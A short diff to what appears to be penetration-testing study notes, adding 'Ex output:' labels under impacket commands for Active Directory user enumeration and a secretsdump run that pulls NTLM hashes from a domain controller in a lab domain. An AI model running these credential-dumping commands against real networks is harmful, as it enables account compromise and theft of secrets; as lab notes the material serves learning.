@@ -5,6 +5,7 @@ impacket-GetADUsers
 ```
 impacket-GetADUsers -all example.htb/olivia -dc-ip 10.129.240.70
 ```
+Ex output:
 ```
 $ impacket-GetADUsers -all example.htb/olivia -dc-ip 10.129.240.70
 Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
@@ -30,6 +31,7 @@ impacket-secretsdump
 ```
 /usr/bin/impacket-secretsdump MARVEL.local/hawkeye:'Password123'@10.0.2.15 -just-dc-ntlm
 ```
+Ex output:
 ```
 $ /usr/bin/impacket-secretsdump MARVEL.local/hawkeye:'Password123'@10.0.2.15 -just-dc-ntlm
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
